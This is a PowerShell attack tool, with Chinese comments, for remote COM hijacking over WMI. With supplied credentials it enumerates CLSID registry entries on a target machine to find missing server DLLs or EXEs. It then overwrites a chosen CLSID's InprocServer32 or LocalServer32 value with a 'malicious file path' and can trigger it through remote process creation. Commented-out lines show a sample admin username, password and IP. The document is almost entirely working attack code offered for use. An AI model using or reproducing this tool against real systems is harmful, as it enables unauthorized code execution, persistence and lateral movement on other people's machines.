function Clear-Server32($Server32)
{
         $Server32 = $Server32.ToLower()
         # 判断是否只是文件名
        if($Server32.contains("\") -eq $False)
        {
            $Server32 = "C:\Windows\system32\" + $Server32
        }
        
        $Server32 = $Server32 -replace  '"'
        $Server32 = $Server32.Trim()
        # 环境变量转换
        $Server32 = $Server32  -replace  "%systemroot%","C:\\Windows"
        $Server32 = $Server32  -replace  "%commonprogramfiles%","C:\Program Files\Common Files"
        $Server32 = $Server32  -replace  "%programfiles%","C:\Program Files"
        $Server32 = $Server32  -replace  "%windir%","C:\Windows"
        $Server32 = $Server32  -replace  "%programfiles[(]x86[)]%","C:\Program Files (x86)"
        
        # 去除参数
         if ($Server32 -like "*.dll*") 
         {
             $position = $Server32.ToLower().IndexOf(".dll") #index of is case sensitive
             $Server32 = $Server32.ToLower().Substring(0, $position) + ".dll"
         }
         if ($Server32 -like "*.exe*") 
         {
             $position = $Server32.ToLower().IndexOf(".exe") #index of is case sensitive
             $Server32 = $Server32.ToLower().Substring(0, $position) + ".exe"
         }
        
        return $Server32
}

function IsRemoteFileExist
{
    Param
    (
        [System.Management.Automation.PSCredential]$Credential,
        [string]$ComputerName,
        [string]$RemoteFilePath
    )
    $RemoteFilePath = $RemoteFilePath.Replace("\\","\")
    $RemoteFilePath = $RemoteFilePath.Replace("\","\\")
    $Query = "Select Name From CIM_DataFile Where Name = '$RemoteFilePath'"
    $Object_FileExist = Get-WmiObject -Query $Query -Credential  $Credential -ComputerName $ComputerName
    if($Object_FileExist -ne $null)
    {
        return $True
    }
    else
    {
        return $False
    }
}

function Find-MissLibraryComByGet-WmiObject
{
    Param
    (
        [System.Management.Automation.PSCredential]$Credential,
        [string]$ComputerName
    )
    $ComSetting = Get-WmiObject -ComputerName $ComputerName -Credential $Credential -class Win32_ComSetting
    ForEach($_ in $ComSetting)
    {
        $regex = "[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}" 
        if(($_.ComponentId -match $regex) -eq $False)
        {
            continue
        }
        # Get TreatAs
        if($_.TreatAsClsid -ne $null)
        {
            $TreatAsClsid = $_.TreatAsClsid
            $Clsid = $_.ComponentId
            Write-Host "[!]Find TreatAsClsid ${Clsid} --->${TreatAsClsid}"
        }
        
        if ($_.LocalServer32 -ne $null)
        {
            $Server32 = $_.LocalServer32
        }
        if($_.InprocServer32 -ne $null)
        {
            $Server32 = $_.InprocServer32
        }
        $ClSid = $_.ComponentId
        
        # {B977CB2D-EC6E-4A8F-BFFE-D18682BB0D52}
        if(($ClSid -ne $null) -and ($Server32 -ne $null))
        {
            
            # 清楚路径上的多余数据
            $Server32 = Clear-Server32($Server32)
            Write-Host "[*]running:${Clsid}----->$Server32 "
            
            # 判断文件是否存在
            if((IsRemoteFileExist -ComputerName $ComputerName -Credential $Credential -RemoteFilePath $Server32) -eq $False)
            {
                Write-Output "[!]Missing File Of LocalServer32 or InprocServer32: ${Clsid}--->${Server32}"
            }
        }
        
    }
}




function Get-Server32Name
{
    Param
    (
        [System.Management.Automation.PSCredential]$Credential,
        [string]$ComputerName,
        $HK,
        [string]$strKeyPath
    )
    $Server32Name = @()
    $arrSubKeys = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -class StdRegProv -Name EnumKey -ArgumentList $HK,$strKeyPath
    if($arrSubKeys.sNames -ne $null)
    {
        ForEach($eachSubKey in $arrSubKeys.sNames)
        {
            if($eachSubKey -eq "InprocServer32")
            {
                $Server32Name = $Server32Name +  "InprocServer32"
            }
            if($eachSubKey -eq "LocalServer32")
            {
                $Server32Name = $Server32Name + "LocalServer32"
            }
        }
    }
    return $Server32Name
}

function Get-MissRegValue_Clsid
{
    Param
    (
        [System.Management.Automation.PSCredential]$Credential,
        [string]$ComputerName,
        $HK,
        [string]$strKeyPath,
        [string]$eachSubKey
    )
     $Clsid = ""
     # 拼接路径
     $KeyPath = $strKeyPath + "\" + $eachSubKey
        
     # 此处最好是获取他的子键的名字[LocalServer32 or InprocServer32]
     $Server32Names = Get-Server32Name -Credential $Credential -ComputerName $ComputerName -HK $HK  -strKeyPath $KeyPath
     if($Server32Names -eq $null)
     {
          return 
     }
     ForEach($Server32Name in $Server32Names)
     {
          $KeyPath2 = $KeyPath + "\" + $Server32Name
          $ValueName = ""
         
          $strRegValue = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -class StdRegProv -Name GetStringValue -ArgumentList $HK,$KeyPath2,$ValueName
          if($strRegValue.sValue -eq $null)
          {
               $Clsid = $eachSubKey
               Write-Output "Missing Value Of LocalServer32 or InprocServer32 --->${Clsid}"
          }
          if($strRegValue.sValue -ne $null)
          {
               $Clsid = $eachSubKey
               $ComPath = $strRegValue.sValue
               Write-Host "[*]running:${KeyPath2}----->${ComPath} "
          }
          
     }

}


function Find-MissLibraryByReg
{
    Param
    (
        #[Parameter(Mandatory=$true, Position=2)]
        [ValidateSet("HKCR","HKLM","HKCU")][String]$RegHive,
        [System.Management.Automation.PSCredential]$Credential,
        [string]$ComputerName
        
    )
    if ($RegHive -eq "HKCR") {
        $HK = 2147483648
        $strKeyPath ="CLSID"
    } elseif ($RegHive -eq "HKLM") {
        $HK = 2147483650
        $strKeyPath = "SOFTWARE\Classes\CLSID"
    } elseif ($RegHive -eq "HKCU") {
        $HK = 2147483649
        $strKeyPath = "SOFTWARE\Classes\CLSID"
    }
    $arrSubKeys = Invoke-WmiMethod -Credential $Credential  -ComputerName $ComputerName -class StdRegProv -Name EnumKey -ArgumentList $HK,$strKeyPath
    
    ForEach($eachSubKey in $arrSubKeys.sNames)
    {
        $regex = "[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}" 
        if(($eachSubKey -match $regex) -eq $False)
        {
            continue
        }
        
        Get-MissRegValue_Clsid -Credential $Credential -ComputerName $ComputerName -HK $HK -strKeyPath $strKeyPath -eachSubKey $eachSubKey
    }
    
}

function Find-MissLibraryCom
{
    Param
    (
       [System.Management.Automation.PSCredential]$Credential,
       [string]$ComputerName
    )
    #Find-MissLibraryComByGet-WmiObject -Credential $Credential -ComputerName $ComputerName
    Find-MissLibraryByReg -RegHive HKCR -Credential $Credential -ComputerName $ComputerName
}

function RemoteCreateInstance
{
     Param
    (
       [System.Management.Automation.PSCredential]$Credential,
       [string]$ComputerName,
       [string]$Clsid
    )
    #$Clsid = "{00020818-0000-0000-C000-000000000046}"
    $command = "[activator]::CreateInstance([type]::GetTypeFromCLSID('$Clsid'))"
    #$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    #$encodedCommand = [Convert]::ToBase64String($bytes)
    $remote_command = "powershell.exe powershell -Command {$command}"
    $process = Invoke-WmiMethod -Credential $Credential -ComputerName $ComputerName -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $remote_command 
}


function Set-ComHiject
{
    Param
    (
       [System.Management.Automation.PSCredential]$Credential,
       [string]$ComputerName,
       [ValidateSet("HKCR","HKLM","HKCU")][String]$RegHive,
       [string]$Clsid,
       [string]$HijectComPath
    )
    if ($RegHive -eq "HKCR") 
    {
        $HK = 2147483648
        $KeyPath ="CLSID"
    } 
    elseif ($RegHive -eq "HKLM") 
    {
        $HK = 2147483650
        $KeyPath = "SOFTWARE\Classes\CLSID"
    }
    elseif ($RegHive -eq "HKCU") 
    {
        $HK = 2147483649
        $KeyPath = "SOFTWARE\Classes\CLSID"
    }
    
    # 首先遍历是否存在ServerName32 一来可以判断是否存在CLSID 二来可以获取ServerName的类型
    $KeyPath2 = $KeyPath + "\" + $Clsid
    $Server32Names = Get-Server32Name -Credential $Credential -ComputerName $ComputerName -HK $HK  -strKeyPath $KeyPath2
    if($Server32Names -ne $null)
    {
        if($Server32Names.count -eq 2)
        {
            $Server32Name = "InProcServer32"
        }
        else
        {
            if(($Server32Names -contains "LocalServer32") -eq $True) #LocalServer32
            {
                $Server32Name = "LocalServer32"
            }
            elseif(($Server32Names -contains "InProcServer32") -eq $True)
            {
                $Server32Name = "InProcServer32"
            }
        }
        
        # 修改注册表
        $RegKey = $KeyPath2 + "\" + $Server32Name
        $KeyValue= $HijectComPath
        $KeyName = ""
        $RegSetValue = Invoke-WmiMethod  -Credential $Credential -ComputerName $ComputerName  -Class StdRegProv -Name SetStringValue -ArgumentList $HK,$RegKey,$KeyValue,$KeyName
        
        # 检查操作结果
        if($RegSetValue.ReturnValue -eq 0)
        {
            # 读取操作结果
            $RegGetValue = Invoke-WmiMethod -Credential $Credential -ComputerName $ComputerName  -class StdRegProv -Name GetStringValue -ArgumentList $HK,$RegKey,$KeyName
            if(($RegGetValue.ReturnValue -eq 0) -and ($RegGetValue.sValue -eq $KeyValue))
            {
                # 确认是否触发
                $Flag = Read-Host "[!]whether to trigger com hijacking[Y/N]>"
                if($Flag.ToLower() -eq "y")
                {
                     #$Instance = [activator]::CreateInstance([type]::GetTypeFromCLSID($Clsid,$ComputerName))
                     RemoteCreateInstance -Credential $Credential -ComputerName $ComputerName -Clsid $Clsid

                }
            }
        }
        
    }
    else
    {
        $Clsid = $KeyName
        Write-Host "[!]do not find ${Clsid}"
    }
    
}

function Find-CLSID
{
    #$UserUsername = "hacky-pc\Administrator"
    #$UserPassword = "wxy.12345"
    #$ComputerName = "192.168.237.129"
    $UserUsername = Read-Host "Input domain/username > "
    $UserPassword = Read-Host "Input password > "
    $ComputerName = Read-Host "Input computername(ip/domain) > "
    $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    $Credential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
    Find-MissLibraryCom  -Credential $Credential -ComputerName $ComputerName

}


function Set-COM
{
    $UserUsername = Read-Host "Input domain/username > "
    $UserPassword = Read-Host "Input password > "
    $ComputerName = Read-Host "Input computername(ip/domain) > "
    $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    $Credential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword

    #$HijectComPath = "c:\test_dll.dll"
    #$Clsid = "{00020818-0000-0000-C000-000000000046}"
    $HijectComPath = Read-Host "please set the malicious file path > "
    $Clsid = Read-Host "which CLSID do you want to COM Inject >"
    Set-ComHiject -Credential $Credential -ComputerName $ComputerName  -RegHive HKCR -Clsid  $Clsid -HijectComPath  $HijectComPath
}

function Remote-CreateInstance
{
    #$Clsid = "{00020818-0000-0000-C000-000000000046}"
    $UserUsername = Read-Host "Input domain/username > "
    $UserPassword = Read-Host "Input password > "
    $ComputerName = Read-Host "Input computername(ip/domain) > "
    $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    $Credential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
    $Clsid = Read-Host "which CLSID do you want to COM Inject >"
    RemoteCreateInstance -Credential $Credential -ComputerName $ComputerName -Clsid $Clsid
}





